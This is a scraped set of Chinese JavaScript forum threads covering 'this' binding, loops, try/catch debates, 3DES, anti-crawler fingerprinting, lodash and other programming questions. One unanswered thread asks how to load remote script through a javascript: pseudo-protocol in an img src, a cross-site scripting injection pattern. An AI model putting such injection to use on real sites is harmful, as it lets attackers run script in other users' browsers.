{"content": ["<div class=\"topic_content\">Js 里面 this 真的是神坑，用着用着就迷糊了，大家都是用什么方法驯服的？</div>"], "reply": "21", "tittle": "有谁已经把魔女［贼丝］完全 hold 住了？", "comment": ["You don't know JS ", "抛弃 OOP 的思维去看 this 就好了……\r", "应该说 this 就是个 context ……", "var self=this;", "1 楼推荐的书很棒，图灵有出版", "╮(╯_╰)╭ ……\r", "\r", "很简单的东西，没什么需要理解啊。记住 this 就是谁调用就指向谁就行了", "var that = this;", "this 一共就 4 种用法啊\r", "\r", "另外我们还有=>", "觉得自己 js 很 nb 的应该看看这个\r", "\r", " ", " \r", "哈哈哈哈哈哈哈哈", "一般都是 var _this = this; \r", "var self = this;", " \r", "\r", "作为一个觉得自己 js 很牛逼的，看完这个表示看来自己有必要着手造一个 target 到 js 的语言了……", "［贼丝］是个什么鬼？能不能好好写标题？", "this 是使用者，弄清楚谁使用了，就是谁负责", " ［ this ］ 有时给我的感觉像 “贼” 一样“油滑”，不容易 hold 住；有时候一旦自以为 hold 住了，却又像陷入了“丝”一样境地，“剪不断，理还乱”。", " \r", "你这个解释，简直不能太 666", "其实当你不清楚 this 是什么的时候， console.log()就基本解决了你的疑问", "多用用 Function.prototype.bind() 就懂了", "看不懂，感觉很厉害样子,", "es6", "这有什么难的，认真过一遍《 javascript 高级程序设计》；如果还是没弄懂，就再看一遍。\r", "\r", "不过现在有 ES6 了，好像简化了不少。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>在 console 中弹出提示\"Scripts may close only the windows that were opened by it\" (脚本只能关闭它所打开的窗口)<br>\n網上找的下面代碼也沒用.求助<br>\ntry{<br>\n    this.focus();<br>\n    self.opener = this;<br>\n    self.close();<br>\n}<br>\ncatch(e){</p>\n\n<p>}</p>\n\n<p>try{<br>\n    window.open('','_self','');<br>\n    window.close();<br>\n}<br>\ncatch(e){</p>\n\n<p>}</p>\n</div></div>"], "reply": "6", "tittle": "js 在谷歌上關閉窗口出錯,哪位前端大神幫看一哈", "comment": ["意思是说只有用脚本打开的窗口才能被脚本关闭，这是出于安全考虑的", "浏览器屏蔽了这个方法。不然我第三方脚本里插段这个 js 你不是永远都打不开那个网页了。。", "這個窗口是通過 C#的 reDirect 實現的，所以屬於非彈出窗口，但是這樣子的話如何關掉呢", "别想了\r", "google 一直在限制这个\r", "直接提示手动关闭好了\r", "js 的权限被限制了", " 現在只能用 window.open （' xxx ','_top',features ）湊合著用啦，但是 features 設置是無效的", " 之前项目中也是\r", "a 链接是_blank 新窗口打开的\r", "js 就无法关闭的"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>passer-by.com</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "自己写的组件，大神求看", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>大四毕业狗，到了要写毕业设计的时候了<br>\n选题选了个二手商城<br>\n初步想法是后端用 node 实现，前后端分离。这样<br>\n无奈自己是个彩笔前端，虽然打算用 node 但是对 node 一众后端框架了解实在不多<br>\n百度一番后发觉前后端分离的话，其实不需要到类似 express 这一类带 html 模板编译的框架？而 restify 更加小巧合适的样子<br>\n于是乎，又发现 restify 的资料好像不多，所以上来求问一下有哪些比较适合像我这种情况，可以快速学习例子(つд⊂)<br>\n以及一般做这些，有什么比较要注意的地方？</p>\n</div></div>"], "reply": "12", "tittle": "有没有什么值得学习的 restify 项目？", "comment": ["express 也不带模板引擎啊， express 或者 koa 都挺好的。", "另外 express 真的是足够小巧了，自带的只 static 这一个中间件了， api 一页可以看完，不能再小了。", "express 可以用 ejs 、 jade 等模板，不意味着你一定要用模板， express 足够小了", " \r", " \r", "这样看来用 express 也是可以的样子。\r", "而且 express 看起来的教程跟案例都更多啊=。=", "楼主，你这样做问题很大，除非你的商城不需要考虑 SEO 。\r", "\r", "而且商城牵涉到流程管理，用 nodejs 异步未必很好。\r", "\r", "另外，我是 express 党。", " \r", "因为我本来就没接怎么接触过后端，处理流程管理跟 nodejs 异步之间的问题确实不了解。\r", "\r", "另外，选 node 明显是因为我在做前端时用到 node 的辅助工具比较多，接触到一点，\r", "而且都是 js 不用在重新学一门语言这样大大众的理由.......\r", "\r", "而我上面也提到过，如果可以的话\r", "我很想知道关于用 node 做这一类商城？开发有什么比较要注意的地方\r", "不过，建立在我没踩过坑的前提下，我又觉得讲了我也不一定能明白", "会 express 的话，基本都会 restify 了，相反也是一样的， restify 在认证和参数获取上跟 express 有点不同，其他感觉没什么太大的区别\r", "做接口服务的话， restify ，做 web express ，所谓的前后端分离貌似跟你学 express 和 restify 之间是没有啥关联的~", "node 后面要学的东西太多了，而且也不仅仅限制于 web 领域", " \r", "\r", "后端正常来说，需要联合查询多个表来确定订单状态。\r", "\r", "比如支付记录表，取消记录表，退货表，发货单表，收货单表。\r", "\r", "很多会有顺序要求，会有逻辑跳转。用异步会显得蛋疼些。\r", "\r", "话说我觉得为什么背景怪怪的。\r", "\r", "你发在 js 区，不是 nodejs 区。", " \r", "看来还是 express 比较适合我这种初学者\r", " \r", "想了一下，这样的顺序流程逻辑确实会遭造成大量的回调嵌套\r", "那么用 promise 来处理这种顺序流程逻辑会不会好一些", " \r", "\r", "你可以尝试一下。\r", "\r", "promise 我用的不是很顺，我一般都是用 async 来做的。", "LZ , restify 的文档已经写了很多了，如果你能看得懂英文。。。。。"]},
{"content": ["<div class=\"topic_content\">昨天写个东西，遍历一个 list a=[xx, xxx, xxxx, ...]\r<br>习惯了 python ，随手就写了 for (i in a)\r<br>然后出错，检查 i 是序号，才想起和 python 不同\r<br>\r<br>这样写好像比 for (i =0;i&lt;a.length;i++) 简单，因为优化往往还要把 a.length 先赋值\r<br>不知道这样写有没有坑</div>", "<div class=\"topic_content\">受教了</div>"], "reply": "10", "tittle": "这样写好像更方便，但不知道是否用错了", "comment": ["要 var i ，否则 i 会变成全局变量", "听说 V8 不能优化 in", " \r", "这个是知道的\r", "\r", " \r", "哦，有这一说？", "有一种观点认为先获取 len 比较快\r", "var len = a.length;\r", "for (var i = 0; i < len; i++)\r", "\r", "~~~~~es6 应该考虑优先用 let 代替 var ，或者用 forEach+lambda\r", "\r", "a.forEach(i => { console.log(i); /* i 不是序号 */ })", "在 ES6 的话倒是可以用 let of:\r", "\r", "```\r", "let arr = [1,2,3,4,5];\r", "for (let i of arr) {\r", "  console.log(i);\r", "}\r", "1\r", "2\r", "3\r", "4\r", "5\r", "```", "for ... in ... 遍历的是对象的属性，包括原型链上的属性\r", "还有个区别就是 for ... in ... 中的索引 i 是一个 string\r", "但是 for ... 中的计数 i 是一个 number", " 说错了，应该是 for of 。。\r", "\r", "for of 跟 上面提到的 .forEach() 最大的区别是 for of 里面可以 break ，这个比较实用一些。", "标准做法应该是 forEach + lambda (ECMA5 可直接忽略\r", "break 的话，古老的法器 prototype 是有支持的，不知道 ECMA6 是否有同样的异常类型", "有坑，\r", "var arr = [0];\r", "arr[100] = 100;\r", "两种循环的结果会有不同\r", "for (var i =0;i<arr.length;i++) {\r", "    console.log(i);\r", "}\r", "//0, 99 次 undefine ， 100\r", "\r", "for (var i in arr) {\r", "    console.log(arr[i]);\r", "}\r", "//0, 100", "坑很多，这里全部说一下（包括上面的）\r", "1. 原型链上的 enumerable 的属性都会被遍历，虽然正常情况不会出问题不过如果谁在 Array.prototype 上放点东西那就可能会出问题了（上面 @", " 提到）\r", "2. 只有被明确赋值（包括赋值为 undefined ）的成员会被遍历，如果没赋值就不会遍历到（上面 @", " 提到）\r", "3. Array 的成员遍历顺序并非一定是増序的。由于标准并未规定 for in 遍历顺序，所以顺序是依赖实现的，不排除某些操作之后在某些浏览器上会发生非増序的遍历。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>刚接触 js 最近在做项目时遇到了后台传来数据需要用 3DES 算法解密的坑，网上找了一推代码都不能用，求大神帮忙！</p>\n</div></div>"], "reply": "19", "tittle": "求 3DES 算法解密的 javascript 实现", "comment": ["你就是懒  谷歌第一个就能用  你把网站的 js 扒下来不就行了", " 早已扒，这个代码用不了", " 敢不敢说下为什么用不了，不提供任何信息，上来就说用不了，你看这个帖子还能有几个人回复", "iv 是啥， key 是啥，用的什么加密模式，搞明白就能解密了", " 谢谢 我浮躁着急了", "谷歌第一个\r", "好奇浏览器端 JS 加解密有什么样的应用场景？", " 很多都用了前端加密啊，微博登录就是", " 不是浏览器端 最近在用 React Native 做移动端 用到了这个", "话说回来为什么使用 3des ，这个算法的安全性早就被证明不行了啊，为什么不用 aes", " 哈 项目后台使用的是 3des 我是前端", "前端用？密钥不就暴露了么？", "前后段通信加密常用的要不就上 HTTPS 要不就 RSA 吧", " 怎么会暴露密钥", "3DES 被秒破。什么系统还在用这个。", " 曾经的老项目 之前停掉了 现在领导要我用 React Naive 重写两个移动端 后台用的还是 老的后台", "对称加密要双方共享密钥啊，密钥存在本地找出来不是很方便。", "npmjs\r", "\r", "browserify-cipher"]},
{"content": ["<div class=\"topic_content\">最近在折腾学校的教务系统，遇到一个问题。\r<br>\r<br>比如说我有三门课，原来设想的是写成一个循环，然后直接使用 chrome 的控制台运行代码，但是在第一次循环提交的时候网页就直接刷新了，进不去第二次循环。有什么办法解决吗？</div>"], "reply": "19", "tittle": "在提交了一个表单之后，如何停留在当前的网页？", "comment": ["Ajax 异步提交，当前页面不会刷新", "注入一个 iframe ，然后把 form 的 taget 指向这个 iframe", "ajax", "用框架吧 这个最简单（表单指定 target ）\r", "\r", "ajax 提交", "看下它提交时发了什么数据，直接改好数据 ajax 提交", "ajax", "你用的啥标签提交，一些表单会有默认行为的导致页面刷新\r", "你可以试试改成 ajax 提交然后阻止默认行为， return false 即可， jquery 的 event.preventDefault 也行，原生 js 的话要分 IE 和 w3c 的阻止默认行为方法兼容一下", "没看懂楼主表达什么\r", "先不考虑 ajax 什么的，不能全部填写完一次性提交吗？", "2L 方法+1", "显然是 ajax 啊   什么年代了还用 iframe", "ajax post formdata", " 不不，解决问题就好，楼主是在 hack ，不是在做 production", "form.serialize ，然后 ajax 异步", " 因为一次只能提交一门课,需要不断提交完所有想选的课...", "console 也可以循环用 ajax 提交嘛...", " 之前并不知道有这么个东西。。。", "楼主不要再问了，用 ajax ，其他的都是乱来", "有些场合不得不用 iframe ……之前遇到过淘宝活动的 API ，测试时候支持 ajax ，结果正式上线了缺不支持了。淘宝支持的工程师说他们 API 没有改，最后不得不用了 iframe ……"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>问题是这样的如何使用 javascript 伪协议调用远程 js,如下是条件怎么写代码呢？<br>\n&lt;img src=javascript:*******&gt;</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "如何用 javascript 伪协议", "comment": []},
{"content": ["<div class=\"topic_content\">（提醒：我不是来问问题的，我已经有自己答案！）\r<br>A 君和 B 君各自用 JS 做一个简单的需求: \r<br>\r<br>function test(foo){\r<br> var  obj=  new foo(); \r<br>\t\r<br> obj.wo.ok.arr.push(\"帅哥\");\r<br>\t \r<br> return obj;\r<br>\r<br>\r<br>}\r<br>\r<br>当 foo 传入错误参数时 程序是肯定是报错的！ obj.wo 无法索引到时，也同样是报错的\r<br>现在 A 君和 B 君分别采用不同的方法\r<br>-------------------------------------------------------------\r<br>  A 君采用的方法是：  \r<br>\r<br>function test(foo) {\r<br>    if (typeof foo == \"function\") {\r<br>        var obj = new foo();\r<br>        if (obj.wo &amp;&amp; obj.wo.ok &amp;&amp; Object.prototype.toString.call(obj.wo.ok.arr) == \"[object Array]\") {\r<br>            obj.wo.ok.arr.push(\"帅哥\");\r<br>            return obj;\r<br>        }\r<br>    }\r<br>    return false;\r<br>}\r<br>----------------------------------------------------------------------------------------\r<br> B 君采用的方法是：\r<br>function test(foo) {\r<br>    try{\r<br>        var obj = new foo();\r<br>        obj.wo.ok.arr.push(\"帅哥\");\r<br>        return obj;\r<br>\t}catch (e){}\r<br>  return false;\r<br>}\r<br>\r<br>\r<br>\r<br>结果 B 君成为了全群公敌，及取笑的对象， A 君和 B 君各不相让， A 君更是大骂 B 君：“你百度看看看，你用 TRY 是菜鸟的行为， TRY 效率很差的，应该尽量避免使用 TRY ”。\r<br>B 君一向按自己的原则做事， B 君不相信百度，坚持自己的 TRY 立场,B 君觉得自己的 TRY 用得完全合理，一气之下愤然离群！\r<br>\r<br>现在问大家：上面两段你觉得 A 君和 B 君的代码 谁的效率最高呢！\r<br>(稍后公布答案）！</div>", "<div class=\"topic_content\">答案参考：  <a target=\"_blank\" href=\"https://github.com/drduan/minggeJS/issues/201\" rel=\"nofollow\">https://github.com/drduan/minggeJS/issues/201</a></div>", "<div class=\"topic_content\">@<a target=\"_blank\" href=\"/member/jarlyyn\">jarlyyn</a>  A 君 B 君代码只是一个演试效果，我并没有说用 try 就不能用  if   了，我从头到尾没这样说\r<br>\r<br>在实际开发中， B 君可以 TRY 再配合适当 if 进行判断，  而 A 君呢，只能 IF 又再多 if 一句。\r<br>最后 A 君的代码，变得又长又没有效率，而 B 君的代码大不了再多一句 if 。一样是轻巧型代码\r<br>\r<br>所以到最后 B 君始终是最后胜利者</div>", "<div class=\"topic_content\">retun false 只是为了让演试具有立体效，为何要捉住 retun false 不放！何必呢\r<br>\r<br>function test(foo) {\r<br>try{\r<br>var obj = new foo();\r<br>obj.wo.ok.arr.push(\"帅哥\");\r<br>return obj;\r<br>}catch (e){\r<br>return \"我要 DEBUG ：\"+e\r<br>}\r<br>\r<br>}</div>"], "reply": "210", "tittle": "反对 try{}catch (e){}的进来， B 君已经是全群公敌！", "comment": ["再翻", "明哥已经暴走了，明哥很生气，后果很严重", "  你不会吧，我还以为你的方案，不使用 TRY ，用更高级的 IF 方法，\r", "你这样还不是一样 B 君方案！\r", "\r", " 你最终的目也是为了 DEBUG 而已\r", "\r", "if (e.name=='TypeError' || e.name=='ReferenceError'){  写来多余吧，  \r", "\r", "直接 throw e; 给外面", " 说了他不信 JSPerf 这个 [测试软件] ——你没看错，是 [测试软件] 。", " \r", "\r", "代码写的太少的人，看到别人写的代码么不知道是什么用的。\r", "\r", "用 if 判断的地方说明是符合函数的约定。\r", "\r", "所以不管是不是用 catch ，都需要进行判断和处理。\r", "\r", "之所以会放在 try 里，只是你强行要放罢了。", "虽然我不知道你们在讨论的啥，但我还是一楼一楼的看完了!\r", "可怜我杨佳一世英名~", "不觉得这里需要 catch 异常，直接 crash 就行了。", "或者 try catch log raise again", " #182 你自己直接滚蛋\r", "知不知道编译器会翻过来？\r", "\r", "程序里不判断 if ， throw catch 的时候还不是要判断。所以 C++里才出现了 nothrow 。 JS 没有，不过是因为性能压力还不到这个程度而已。说到底解释器还是要判断。真要性能，用 C ，用汇编去啊，自己写浏览器去啊，别用 JS 在这里 BB 。", "V8 不会对包含 try...catch...的 function 进行优化， 但是产品中使用 try...catch...是不可避免的， 所以需要将 try...catch...单独提出来，以免 main function 无法被优化：\r", "\r", "function tryCatch(fn, context, catcher){\r", "    try {\r", "        return fn.apply(context, args);\r", "    }\r", "    catch(e) {\r", "        return catcher(e)\r", "    }\r", "}\r", "\r", "function main(){\r", "    tryCatch(something ...)\r", "}"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>对，就是要封死爬虫。<br>\n我想知道除了 https api 加密 爬虫陷阱，还有就是设置一些普通人不会点的链接诱导爬虫点击然后不停封之，还有什么能反爬虫的吗？</p>\n\n<p>如何使用 js 采集客户端的指纹呢？</p>\n</div></div>"], "reply": "18", "tittle": "如何用 js 获取客户端指纹呢？ # 论高级反爬虫反盗窃 API 的技巧", "comment": ["封死爬虫很简单\r", "1. 封 ip\r", "2. 找免费代理，封 ip 。", "听说淘宝是用鼠标轨迹来判断的。。", "登陆后浏览", " 到处都能见到你…你的头像已经深深的印入我的脑海", "早就有公司专门做这个了，不过他是用来跟踪用户的，你也可以一样用作其他\r", "爬虫\r", "反爬虫\r", "反反爬虫\r", "。。。。。。", " \r", "反反反爬虫", " \r", "ABP\r", "against ABP\r", "Against ABP Killer\r", "……", " 真人概率低于 50%的屏蔽之", "浏览器指纹\r", "\r", "\r", "\r", "Blocked net 基本都能封掉", " \r", "反反反反爬虫", "通过鼠标轨迹可以做", "浏览器指纹追踪手机有点难，尤其是 iPhone\r", "同一个网络+手机+系统版本+浏览器版本一样的情况太多了，附近就能找到 3 台指纹一样的 iPhone", "在实习公司做过相关的，主要是大规模的代理 ip 库，如果是注册，那就还需要大规模的打码手机号库", " 它的登录表单有一个专门的字段用来收集用户操作，好像只要触发事件就会记录。打开开发者工具就能看到了，一闪一闪的😂", "微信公众平台即将开放 JS API 调用手机指纹验证能力，而且是一套 API 跨 iOS 和 Android 。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a target=\"_blank\" rel=\"nofollow\" href=\"http://lodash.think2011.net/clone\">http://lodash.think2011.net</a></p>\n\n<p>lang 这个分类下的功能大概都是一些复制、判断、转换等的处理，所以我不明白 lang 是什么意思。</p>\n\n<p>接着查找资料有 关于 java ，有 java.lang... 这样的说法，不过对 java 不熟悉。</p>\n\n<p>请问 lang 除了语言还有没有别的意义？</p>\n\n<p>P.S ：对文档感兴趣的朋友可以看这个 <a target=\"_blank\" rel=\"nofollow\" href=\"http://lodash.qiuqudou.com/\">http://lodash.qiuqudou.com/</a>，是一份比较完善的 lodah3 的文档。</p>\n</div></div>"], "reply": "13", "tittle": "正在慢吞吞翻译 lodash4 的文档，其中 lang 这个分类应该如何翻译？", "comment": ["顺便说一下，我觉得 运算 感觉比较接近意思，不知道是否可以。", "有参数，有返回值，不就是函数吗？\r", "反倒是 function 类别下的，参数和返回值都含有 function", "Lang, language, 代表语言级别特性", "好奇，文档为什么要翻译，翻译过来还怎么查找关键词", "我还以为是出 v4 了", " 啊，原来是这样，实在想不出如何描述，所以想想还是不翻译这部分了。\r", "\r", "  属于 lodash 的语法的不会翻译的，要翻译的部分就是语法的解释，不影响查找。\r", "\r", " 应该快了吧，因学习所以翻译没发布的版本。", "就保留 lang ，不用翻译", "这种程序代码用到的东西东西一般都要原样留着（废话），顶多加一对圆括号写成 `lang`（语言）。\r", "\r", "当然我一贯旗帜鲜明地反对[翻译（非编程入门的）开发者 API 文档]( ", "\r", "\r", "* 你的文档包含的东西都是程序员看的东西。这是你想翻译的吗？你应该更想翻译给最终用户看的才对。\r", "* 你的受众有多大？这群程序员有几个写着 if then while 不懂英语，会因为你的文档翻译受益的？这些人看翻译带来的（能写出某些奇奇怪怪代码）的好处和你的付出成正比吗？\r", "* 你有多少时间？ lodash 那么多 API ，你要多少个人月完成？你有没有借助 po4a 、 Transifex Live 之类的手段管理和复用翻译？\r", "* 你长期以来有没有什么承诺和保证？ lodash 4 API 总是要更新的，你也会一直管下去，让你的翻译不要废掉吗？大版本号更新之后呢？", " \r", "\r", "* 是会保留编程用语，问这个问题是因为觉得左侧的导航加上\"中文（原文）\"这样的会方便看，问了认识的朋友，似乎没有必要。\r", "* lodash 有专门的文档工具，是直接提取文档注释来生成的。\r", "* 关于更新用了工具一直 watch github 上的源码变动，有变动就增量翻译，然后合并更新。\r", "* 关于时间，确实没好好规划，只是想到翻译完了，有更新就更新，这一点考虑的很糟糕，谢谢提醒，我该好好思考清楚。", "哈哈，早就开始对这个文档开始翻译了，但是源码读到一半就没继续了，楼主加油。。。", "3 和 4 有什么区别呢？\r", "还有， underscore 是不是可以不用了？", " 看起来不久后就要被取代了，优胜劣汰呗。\r", "\r", "我之前没有用过 lodash ，但是在翻译的时候发现 4 和 3 比的话，多了几个方法，并简化了使用方式（翻译完所有 array 分类之后）。", "我看了一下，那个 Lang 是分类名称，直接翻译成“语言特性”比较好。"]},
{"content": ["<div class=\"topic_content\">目前用循环判断，感觉有点....\r<br>\r<br>Google 了一番，没有找到答案，来求问 V 友。\r<br>\r<br>----\r<br>项目背景\r<br>一个 Chrome 插件给当前页面注入了 JS （ content script)，需要根据 URL 变化来做一些事情。</div>"], "reply": "10", "tittle": "如何监听 location.href 这个值发生了变化？", "comment": ["记得有 history.js ？", "不能记录上一次的 location jref 么，然后做对比？", "  所以需要有个循环（ setTimeout  ） 一直去比较？现在就是这么做的", "onhashchange, beforeunload?\r", "AngularJS 有这个功能，你可以看看是怎么实现的", "href 如果是 hash 部分变了，有 hashchange\r", "如果不是 hash 部分，页面会重新加载，有 beforeunload / unload \r", "如果是使用 history api 改动，有 history.onpushstate / history.onpopstate", "location.__defineSetter__(\"herf\",function(){debugger;})\r", "这样？？？", "老旧版本的浏览器还是要用 setTimeout 的，新的浏览器就可以参考楼上的。", "window.addEventListener('hashchange', function() { });", "historyAPI 优选，其次 hashcange 事件"]},
{"content": ["<div class=\"topic_content\">本人 js 水平: 入门</div>"], "reply": "2", "tittle": "underscore 和 lodash 兼容，应该读哪个源码？", "comment": ["我听别人说，这俩库不是有点过时嘛，，拥抱 es5 ， es6 ，，这俩库好多功能已经原生实现", " 为了兼容和一致性，还是要用的。"]},
{"content": ["<div class=\"topic_content\">var list=[{\r<br>\t\t\t\"name\":\"仙姑\",\r<br>\t\t\t\"content\":\"哈哈真厉害\",\r<br>\t\t\t\"report\":[\r<br>\t\t\t\t{\r<br>\t\t\t\t\t\"name\":\"和尚\",\r<br>\t\t\t\t\t\"content\":\"笑的真淫荡\"\r<br>\t\t\t\t\t\"report\":[\r<br>\t\t\t\t\t]\r<br>\t\t\t\t},\r<br>\t\t\t\t{\r<br>\t\t\t\t\t\"name\":\"法海\",\r<br>\t\t\t\t\t\"content\":\"笑的真风骚\"\r<br>\t\t\t\t\t\"report\":[\r<br>\t\t\t\t\t\t\"name\":\"道姑\",\r<br>\t\t\t\t\t\t\"content\":\"不风骚\"\r<br>\t\t\t\t\t\t\"report\":[\r<br>\r<br>\t\t\t\t\t\t]\r<br>\r<br>\t\t\t\t\t]\r<br>\t\t\t\t}\r<br>\t\t\t]\r<br>\r<br>\t\t},\r<br>               .....\r<br>]</div>"], "reply": "3", "tittle": "求一道 javascript 的遍历算法", "comment": ["foreach ？", "递归？", "递归+forEach ？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>问题分解：<br>\n1 、有没有比较好用的阅读工具<br>\n2 、有没有一些比较好的阅读方法</p>\n</div></div>"], "reply": "7", "tittle": "如何阅读一个巨大的 js 文件？", "comment": ["WebStorm ，先格式化代码然后利用其中的交叉引用功能", "EverEdit, 然后 Js->Beautify JS", "我觉得巨大看怎么定义了。。。如果是那种通过生成出来的 js ，放弃阅读比较好，如果单纯几百行的，格式化成统一的格式基本也能读了，再不济还有 idea 给我把函数什么的抽取出一个列表，也能凑合", "WS   强大的语义分析", "维护过 单个 js 文件 8000 多行的项目  想哭。", " 所以您是怎么做的？", " 用到哪个方法 在仔细阅读。。。 不然看到第 200 行 都忘了前 100 行是干啥的了。。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>在 github 上看到歪果人弄的 <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/loverajoel/jstips\">每天一个 JavaScript Tip </a> ，<br>\n于是自己也弄了一个：<a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/sunyuhui/JavaScript-Tips\">JavaScript-Tips</a><br>\n会参考歪果人的，但是每个都是经过自己思考的。<br>\n欢迎拍砖 ~</p>\n</div></div>"], "reply": "2", "tittle": "每天一个 JavaScript Tip（已更新 6 天）", "comment": ["应该做个每日一吐槽，吐槽各种 js 语言和框架的坑爹设计", "比较一般，好多都是书里面有的，看 effective js ，来的更快"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>Blog <a target=\"_blank\" rel=\"nofollow\" href=\"https://blogs.windows.com/msedgedev/2016/01/13/chakracore-now-open/\">https://blogs.windows.com/msedgedev/2016/01/13/chakracore-now-open/</a><br>\nGitHub <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/Microsoft/ChakraCore\">https://github.com/Microsoft/ChakraCore</a></p>\n</div></div>"], "reply": "5", "tittle": "微软 ChakraCode JavaScript 引擎已经在 GitHub 开源了", "comment": ["微软大法好", "如果能调用一些系统的接口就好了", " 源码都有了可以自己扩展呀", "这样就能代替 CEF  希望能小一点。", "ES6 方面， nodejs chakra 分支感觉已经超过 v8 了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><div class=\"highlight\"><pre><span class=\"kd\">var</span> <span class=\"nx\">Person</span> <span class=\"o\">=</span> <span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">name</span><span class=\"p\">)</span> <span class=\"p\">{</span> <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">name</span> <span class=\"o\">=</span> <span class=\"nx\">name</span> <span class=\"p\">};</span>\n<span class=\"kd\">var</span> <span class=\"nx\">foo</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"nx\">Person</span><span class=\"p\">(</span><span class=\"s2\">\"foo\"</span><span class=\"p\">);</span>\n<span class=\"nx\">foo</span> <span class=\"c1\">// { name: 'foo' }</span>\n<span class=\"nx\">foo</span><span class=\"p\">.</span><span class=\"nx\">constructor</span><span class=\"p\">.</span><span class=\"nx\">toString</span><span class=\"p\">()</span> <span class=\"c1\">// 'function (name) { this.name = name }'</span>\n<span class=\"nx\">Person</span><span class=\"p\">.</span><span class=\"nx\">prototype</span><span class=\"p\">.</span><span class=\"nx\">constructor</span><span class=\"p\">.</span><span class=\"nx\">toString</span><span class=\"p\">()</span> <span class=\"c1\">// 'function (name) { this.name = name }'</span>\n\n<span class=\"c1\">// 改写 constructor 指向的构造函数</span>\n<span class=\"nx\">Person</span><span class=\"p\">.</span><span class=\"nx\">prototype</span><span class=\"p\">.</span><span class=\"nx\">constructor</span> <span class=\"o\">=</span> <span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">name</span><span class=\"p\">)</span> <span class=\"p\">{</span> <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">name</span> <span class=\"o\">=</span> <span class=\"s2\">\"bar\"</span> <span class=\"p\">}</span>\n\n<span class=\"nx\">Person</span><span class=\"p\">.</span><span class=\"nx\">prototype</span><span class=\"p\">.</span><span class=\"nx\">constructor</span><span class=\"p\">.</span><span class=\"nx\">toString</span><span class=\"p\">()</span> <span class=\"c1\">// 'function (name) { this.name = \"bar\" }'</span>\n<span class=\"kd\">var</span> <span class=\"nx\">foo2</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"nx\">Person</span><span class=\"p\">(</span><span class=\"s2\">\"foo2\"</span><span class=\"p\">);</span>\n<span class=\"nx\">foo2</span><span class=\"p\">.</span><span class=\"nx\">constructor</span><span class=\"p\">.</span><span class=\"nx\">toString</span><span class=\"p\">()</span> <span class=\"c1\">// 'function (name) { this.name = \"bar\" }'</span>\n\n<span class=\"c1\">// 期待是 { name: 'bar' } 因为构造函数已变了</span>\n<span class=\"c1\">// 但是...</span>\n<span class=\"nx\">foo2</span> <span class=\"c1\">// { name: 'foo2' }</span>\n</pre></div>\n</div></div>"], "reply": "15", "tittle": "为什么无法更改 JS 的构造函数呢？", "comment": ["在最后试试 Person.toString() 看看。\r", "Person 本来就是一个 function 了。 要改变的话直接赋值  Person = func 就好了。", " 原来如此，貌似我那样做只是把 Person.prototype 对象给改写了\r", "\r", "```javascript\r", "// 原本\r", "Person === Person.prototype.constructor // true\r", "// 改写后\r", "Person === Person.prototype.constructor // false\r", "Person.toString(); // 依旧是 'function (name) { this.name = name }'\r", "```", "1. 函数都有 prototype 对象，其中默认包含一个属性 constructor ，一般情况下默认指向函数自身\r", "2. 以你的例子来说， foo1. __proto__ === Person.prototype ，修改 constructor 是没有用的，它只是一个天生就默认存在的标志，但本身不具备实际意义\r", "3. 你的任何实例化方法本身不存在 toString 方法，那么就会向构造函数 Person 上查找。没有的话就继续向 Function.prototype 上查找，还是没有就继续在 Function.prototype.__proto__ 也就是 Object.prototype 上查找，于是你里面所有的 toString 其实最终调用的都是 Object.prototype.toString 方法\r", "4. 要达到你的效果修改 constructor 是没用的，关键是要在 foo1 和 foo2 之间切断原型链", " “那么就会向构造函数 Person 上查找” => “那么就会向构造函数 Person.prototype 上查找”", "我搞错了，请看下面的\r", "\r", "var Person = function(name) {\r", "    this.name = name\r", "};\r", "\r", "var foo = new Person(\"foo\");\r", "\r", "console.log(foo.toString === Person.prototype.toString); // true\r", "console.log(Person.prototype.toString === Person.prototype.__proto__.toString); // true\r", "console.log(Person.prototype.__proto__.toString === Object.prototype.toString); // true\r", "\r", "console.log(Person.toString === Function.prototype.toString); // true\r", "console.log(Function.prototype.toString === Object.toString); // true\r", "\r", "我上面说的第 3 点有误。。。", "还得补上这个 = =。\r", "\r", "console.log(Person.toString === Function.prototype.toString); // true\r", "console.log(Function.prototype.toString === Object.toString); // true\r", "console.log(Function.prototype.toString === Function.toString); // true\r", "console.log(Function.toString === Object.toString); // true\r", "console.log(Function.__proto__ === Object.__proto__); // true\r", "\r", "好微妙的关系（好了我去睡了，大晚上脑子混乱又乱扯了。。。）", "没睡着 =。= 爬起来**貌似**搞清了，直接上图\r", "\r", " ", " 我真去睡了\r", "大晚上脑子果然不清醒\r", "\r", "Function.prototype.__proto__ 指向的应该是 Object.prototype 而不是 Person 的。。。\r", "啊啊啊啊啊啊啊啊 救命啊好丢人", "补完睡觉，刷屏抱歉\r", "\r", " ", " 能够见到这么认真的回复以及对技术的认真态度，小弟膜拜", " Orz 膜拜！您的全部回复都给了感谢！", " 这图用什么工具画的，太厉害了", " 并没有认真啦，就是有点强迫症 >w<\r", "\r", " 谢谢哈~~受宠若惊\r", "\r", " 用的是 iOS 上的 Paper 53 ，然后扔电脑上用了 Pixelmator 加了个字 -_- ||", " 正纳闷这浓浓的 Paper 感是怎么揉进文字的，原来还有后期……", " 哈哈哈\r", 